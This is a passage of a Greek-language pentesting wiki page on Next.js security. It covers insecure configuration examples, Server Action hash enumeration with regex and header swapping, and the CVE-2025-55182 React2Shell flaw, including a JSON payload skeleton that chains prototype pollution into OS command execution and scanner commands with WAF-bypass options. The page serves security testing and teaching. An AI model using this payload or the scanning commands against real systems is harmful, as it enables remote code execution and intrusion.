- **`'*'`:** Επιτρέπει τη φόρτωση εικόνων από οποιαδήποτε εξωτερική πηγή, συμπεριλαμβανομένων μη αξιόπιστων ή κακόβουλων domains. Οι επιτιθέμενοι μπορούν να φιλοξενήσουν εικόνες που περιέχουν κακόβουλα payloads ή περιεχόμενο που παραπλανά τους χρήστες.
- Ένα άλλο πρόβλημα μπορεί να είναι να επιτρέπεται ένα domain **όπου οποιοσδήποτε μπορεί να ανεβάσει μια εικόνα** (όπως `raw.githubusercontent.com`)

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Εισάγοντας εικόνες από κακόβουλες πηγές, οι επιτιθέμενοι μπορούν να εκτελέσουν phishing attacks, να εμφανίσουν παραπλανητικές πληροφορίες ή να εκμεταλλευτούν ευπάθειες σε image rendering libraries.

</details>

<details>

<summary>Έκθεση Μεταβλητών Περιβάλλοντος</summary>

Διαχειριστείτε ευαίσθητες πληροφορίες όπως API keys και database credentials με ασφάλεια χωρίς να τις εκθέτετε στον client.

#### a. Έκθεση Ευαίσθητων Μεταβλητών

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Πρόβλημα:**

- **`SECRET_API_KEY`:** Χωρίς το πρόθεμα `NEXT_PUBLIC_`, το Next.js δεν εκθέτει μεταβλητές στον client. Ωστόσο, αν προστεθεί κατά λάθος πρόθεμα (π.χ. `NEXT_PUBLIC_SECRET_API_KEY`), η μεταβλητή γίνεται προσβάσιμη από τον client.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Εάν ευαίσθητες μεταβλητές εκτίθενται στον client, οι επιτιθέμενοι μπορούν να τις ανακτήσουν εξετάζοντας τον κώδικα στην πλευρά του client ή τα αιτήματα δικτύου, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε APIs, βάσεις δεδομένων ή άλλες υπηρεσίες.

</details>

<details>

<summary>Ανακατευθύνσεις</summary>

Διαχειριστείτε τις ανακατευθύνσεις URL και τα rewrites μέσα στην εφαρμογή σας, εξασφαλίζοντας ότι οι χρήστες προωθούνται σωστά χωρίς να εισάγονται open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Πρόβλημα:**

- **Dynamic Destination:** Επιτρέπει στους χρήστες να καθορίζουν οποιοδήποτε URL, επιτρέποντας open redirect attacks.
- **Trusting User Input:** Ανακατευθύνσεις σε URLs που παρέχονται από χρήστες χωρίς έλεγχο μπορούν να οδηγήσουν σε phishing, malware distribution, ή credential theft.

**Πώς το εκμεταλλεύονται οι επιτιθέμενοι:**

Οι επιτιθέμενοι μπορούν να κατασκευάσουν URLs που φαίνεται να προέρχονται από το domain σας αλλά ανακατευθύνουν τους χρήστες σε κακόβουλους ιστότοπους. Για παράδειγμα:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Οι χρήστες που εμπιστεύονται το αρχικό domain μπορεί χωρίς να το γνωρίζουν να μεταβούν σε κακόβουλες ιστοσελίδες.

</details>

<details>

<summary>Webpack Configuration</summary>

Προσαρμόστε τις ρυθμίσεις του Webpack για την εφαρμογή Next.js, κάτι που μπορεί ακούσια να εισάγει ευπάθειες ασφαλείας αν δεν αντιμετωπιστεί προσεκτικά.

#### a. Αποκάλυψη ευαίσθητων modules

**Κακό Παράδειγμα Διαμόρφωσης:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Πρόβλημα:**

- **Αποκάλυψη Ευαίσθητων Διαδρομών:** Το aliasing ευαίσθητων καταλόγων και η παροχή client-side πρόσβασης μπορούν να οδηγήσουν σε leak εμπιστευτικών πληροφοριών.
- **Συσκευασία Μυστικών:** Αν ευαίσθητα αρχεία περιλαμβάνονται (bundled) για τον client, το περιεχόμενό τους γίνεται προσβάσιμο μέσω source maps ή με την επιθεώρηση του client-side code.

**Πώς οι επιτιθέμενοι το εκμεταλλεύονται:**

Οι επιτιθέμενοι μπορούν να αποκτήσουν πρόσβαση ή να ανακατασκευάσουν τη δομή καταλόγων της εφαρμογής, ενδεχομένως εντοπίζοντας και εκμεταλλευόμενοι ευαίσθητα αρχεία ή δεδομένα.

</details>

### `pages/_app.js` και `pages/_document.js`

#### **`pages/_app.js`**

**Σκοπός:** Αντικαθιστά το προεπιλεγμένο component App, επιτρέποντας global state, styles και layout components σε όλη την εφαρμογή.

**Περιπτώσεις χρήσης:**

- Ενσωμάτωση global CSS.
- Προσθήκη layout wrappers.
- Ενσωμάτωση βιβλιοθηκών διαχείρισης state.

**Παράδειγμα:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Σκοπός:** Αντικαθιστά το προεπιλεγμένο Document, επιτρέποντας την προσαρμογή των ετικετών `<html>` και `<body>`.

**Περιπτώσεις χρήσης:**

- Τροποποίηση των `<html>` ή `<body>` ετικετών.
- Προσθήκη meta tags ή προσαρμοσμένων scripts.
- Ενσωμάτωση γραμματοσειρών τρίτων.

**Παράδειγμα:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Προσαρμοσμένος διακομιστής (Προαιρετικό)

**Σκοπός:** Ενώ το Next.js έρχεται με ενσωματωμένο διακομιστή, μπορείτε να δημιουργήσετε έναν προσαρμοσμένο διακομιστή για προχωρημένες περιπτώσεις χρήσης όπως προσαρμοσμένη δρομολόγηση ή ενσωμάτωση με υπάρχουσες backend υπηρεσίες.

**Σημείωση:** Η χρήση προσαρμοσμένου διακομιστή μπορεί να περιορίσει τις επιλογές ανάπτυξης, ειδικά σε πλατφόρμες όπως η Vercel που βελτιστοποιούν για τον ενσωματωμένο διακομιστή του Next.js.

**Παράδειγμα:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Πρόσθετες αρχιτεκτονικές και θέματα ασφάλειας

### Μεταβλητές περιβάλλοντος και ρυθμίσεις

**Σκοπός:** Διαχείριση ευαίσθητων πληροφοριών και ρυθμίσεων εκτός του κώδικα.

**Βέλτιστες πρακτικές:**

- **Χρησιμοποιήστε αρχεία `.env`:** Αποθηκεύστε μεταβλητές όπως API keys σε `.env.local` (εξαιρείται από τον έλεγχο έκδοσης).
- **Πρόσβαση στις μεταβλητές με ασφάλεια:** Χρησιμοποιήστε `process.env.VARIABLE_NAME` για πρόσβαση στις μεταβλητές περιβάλλοντος.
- **Μην εκθέτετε ποτέ μυστικά στον client:** Βεβαιωθείτε ότι οι ευαίσθητες μεταβλητές χρησιμοποιούνται μόνο server-side.

**Παράδειγμα:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Σημείωση:** Για να περιορίσετε μεταβλητές μόνο στο server-side, παραλείψτε τες από το `env` object ή προσθέστε το πρόθεμα `NEXT_PUBLIC_` για έκθεση στον client.

### Authentication and Authorization

**Approach:**

- **Session-Based Authentication:** Χρησιμοποιήστε cookies για τη διαχείριση των user sessions.
- **Token-Based Authentication:** Υλοποιήστε JWTs για stateless authentication.
- **Third-Party Providers:** Ενσωματώστε OAuth providers (π.χ., Google, GitHub) χρησιμοποιώντας βιβλιοθήκες όπως `next-auth`.

**Security Practices:**

- **Secure Cookies:** Θέστε τα attributes `HttpOnly`, `Secure`, και `SameSite`.
- **Password Hashing:** Κάντε πάντα hash τα passwords πριν την αποθήκευση.
- **Input Validation:** Αποτρέψτε injection attacks επαληθεύοντας και καθαρίζοντας (validating και sanitizing) τα inputs.

**Παράδειγμα:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Βελτιστοποίηση Απόδοσης

**Στρατηγικές:**

- **Image Optimization:** Χρησιμοποιήστε το component `next/image` του Next.js για αυτόματη βελτιστοποίηση εικόνων.
- **Code Splitting:** Αξιοποιήστε dynamic imports για να χωρίσετε τον κώδικα και να μειώσετε τους αρχικούς χρόνους φόρτωσης.
- **Caching:** Εφαρμόστε στρατηγικές caching για API responses και static assets.
- **Lazy Loading:** Φορτώστε components ή assets μόνο όταν χρειάζονται.

**Παράδειγμα:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Το σύγχρονο Next.js χρησιμοποιεί “Server Actions” που εκτελούνται στον server αλλά καλούνται από τον client. Σε production αυτές οι κλήσεις είναι αδιαφανείς: όλα τα POSTs καταλήγουν σε ένα κοινό endpoint και διακρίνονται από ένα build-specific hash που αποστέλλεται στην κεφαλίδα `Next-Action`. Παράδειγμα:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Όταν το `productionBrowserSourceMaps` είναι ενεργοποιημένο, τα minified JS chunks περιέχουν κλήσεις προς `createServerReference(...)` που leak αρκετή δομή (συν τα συνοδευτικά source maps) ώστε να ανακτήσετε μια αντιστοίχιση μεταξύ του action hash και του αρχικού ονόματος συνάρτησης. Αυτό σας επιτρέπει να μεταφράσετε hashes που παρατηρούνται στο `Next-Action` σε συγκεκριμένους στόχους όπως `deleteUserAccount()` ή `exportFinancialData()`.

### Προσέγγιση εξαγωγής (regex on minified JS + optional source maps)

Αναζητήστε τα κατεβασμένα JS chunks για `createServerReference` και εξαγάγετε το hash και το function/source symbol. Δύο χρήσιμα patterns:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Ομάδα 1: server action hash (40+ hex chars)
- Ομάδα 2: symbol or path που μπορεί να επιλυθεί στο αρχικό όνομα συνάρτησης μέσω του source map όταν υπάρχει

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Πρακτική ροή εργασίας

- Παθητική ανίχνευση κατά την περιήγηση: καταγράψτε αιτήματα με `Next-Action` headers και JS chunk URLs.
- Κατεβάστε τα αναφερόμενα JS bundles και τα συνοδευτικά `*.map` αρχεία (όταν υπάρχουν).
- Εκτελέστε το regex παραπάνω για να δημιουργήσετε ένα λεξικό hash↔name.
- Χρησιμοποιήστε το λεξικό για στοχοθετημένες δοκιμές:
  - Triaging με βάση το όνομα (π.χ., `transferFunds`, `exportFinancialData`).
  - Παρακολουθήστε την κάλυψη ανά build με βάση το όνομα συνάρτησης (hashes αλλάζουν ανά build).

### Exercising hidden actions (template-based request)

Πάρτε ένα έγκυρο POST που παρατηρήθηκε στο proxy ως πρότυπο και αντικαταστήστε την τιμή `Next-Action` για να στοχεύσετε άλλη ανακαλυφθείσα ενέργεια:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Επανάληψη στο Repeater και δοκιμή της εξουσιοδότησης, του ελέγχου εισόδου και της επιχειρησιακής λογικής ενεργειών που διαφορετικά είναι μη προσβάσιμες.

### Burp αυτοματοποίηση

- NextjsServerActionAnalyzer (Burp extension) αυτοματοποιεί τα παραπάνω στο Burp:
- Εξορύσσει το ιστορικό του proxy για JS chunks, εξάγει τις `createServerReference(...)` εγγραφές και αναλύει source maps όταν είναι διαθέσιμα.
- Διατηρεί ένα αναζητήσιμο λεξικό hash↔function-name και αφαιρεί διπλότυπα ανά builds με βάση το function name.
- Μπορεί να εντοπίσει ένα έγκυρο template POST και να ανοίξει μια έτοιμη προς αποστολή καρτέλα Repeater με το hash της στοχευόμενης ενέργειας αντικατεστημένο.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Σημειώσεις και περιορισμοί

- Απαιτεί `productionBrowserSourceMaps` ενεργοποιημένο σε production για την ανάκτηση ονομάτων από bundles/source maps.
- Η αποκάλυψη του function-name δεν είναι ευπάθεια από μόνη της· χρησιμοποιήστε την για να καθοδηγήσετε την ανακάλυψη και να δοκιμάσετε την εξουσιοδότηση κάθε ενέργειας.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Deployments του Next.js App Router που εκθέτουν Server Actions στο `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** περιέχουν μια κρίσιμη server-side prototype pollution κατά τη διάρκεια της αποσειριοποίησης chunks του **Flight**. Με τη δημιουργία `$` references μέσα σε ένα Flight payload, ένας επιτιθέμενος μπορεί να μεταβεί από μολυσμένα prototypes σε αυθαίρετη JavaScript εκτέλεση και έπειτα σε εκτέλεση εντολών OS μέσα στη διαδικασία Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Αλυσίδα επίθεσης σε Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Σκελετός payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Χαρτογράφηση έκθεσης React Server Function

Οι React Server Functions (RSF) είναι οποιεσδήποτε συναρτήσεις που περιλαμβάνουν την οδηγία 'use server';. Κάθε form action, mutation ή fetch helper που δεσμεύεται σε μία από αυτές τις συναρτήσεις γίνεται RSC Flight endpoint που εύκολα αποσειριακοποιεί attacker-supplied payloads. Χρήσιμα recon βήματα που προκύπτουν από React2Shell assessments:

- **Static inventory:** αναζητήστε την οδηγία για να καταλάβετε πόσα RSFs εκτίθενται αυτόματα από το framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` ενεργοποιεί το App Router + `app/` directory από προεπιλογή, το οποίο σιωπηλά μετατρέπει κάθε route σε ένα RSC-capable endpoint. App Router assets όπως `/_next/static/chunks/app/` ή responses που stream-άρουν Flight chunks πάνω σε `text/x-component` είναι ισχυρά Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** Η ίδια η advisory του React σημειώνει ότι εφαρμογές που διανέμουν το RSC runtime μπορούν να είναι εκμεταλλεύσιμες **ακόμα και χωρίς ρητά RSFs**, οπότε θεωρήστε οποιοδήποτε build που χρησιμοποιεί `react-server-dom-*` 19.0.0–19.2.0 ως ύποπτο.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, κ.λπ. επαναχρησιμοποιούν τον ίδιο serializer και κληρονομούν την ίδια remote attack surface έως ότου ενσωματώσουν patched React builds.

#### Κάλυψη εκδόσεων (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **ευπαθή** στις 19.0.0, 19.1.0–19.1.1 και 19.2.0; **διορθωμένα** στις 19.0.1, 19.1.2 και 19.2.1 αντίστοιχα.
- **Next.js stable:** Οι App Router releases 15.0.0–16.0.6 ενσωματώνουν το ευπαθές RSC stack. Οι patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 περιλαμβάνουν fixed deps, οπότε οποιοδήποτε build κάτω από αυτές τις εκδόσεις είναι υψηλής αξίας.
- **Next.js canary:** `14.3.0-canary.77+` επίσης διανέμει το buggy runtime και επί του παρόντος δεν υπάρχουν patched canary drops, καθιστώντας αυτά τα fingerprints ισχυρούς υποψήφιους για εκμετάλλευση.

#### Απομακρυσμένο oracle ανίχνευσης

Το `react2shell-scanner` της Assetnote (https://github.com/assetnote/react2shell-scanner) στέλνει ένα crafted multipart Flight request σε υποψήφιες διαδρομές και παρατηρεί τη συμπεριφορά στον server:

- **Default mode** εκτελεί ένα deterministic RCE payload (μια μαθηματική πράξη που ανακλάται μέσω `X-Action-Redirect`) αποδεικνύοντας την εκτέλεση κώδικα.
- **`--safe-check` mode** purposefully malforms το Flight message έτσι ώστε patched servers να επιστρέφουν `200/400`, ενώ τα ευάλωτα targets εκπέμπουν `HTTP/500` responses που περιέχουν το substring `E{"digest"` μέσα στο σώμα. Το ζεύγος `(500 + digest)` είναι προς το παρόν το πιο αξιόπιστο remote oracle που έχουν δημοσιεύσει οι defenders.
- Τα ενσωματωμένα `--waf-bypass`, `--vercel-waf-bypass`, και `--windows` switches προσαρμόζουν το layout του payload, προσθέτουν junk, ή ανταλλάσσουν OS commands ώστε να μπορείτε να ερευνήσετε πραγματικά Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Αναφορές

- [Pentesting Next.js Server Actions — Μια Burp επέκταση για Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp επέκταση)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – Όλα όσα πρέπει να ξέρετε](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
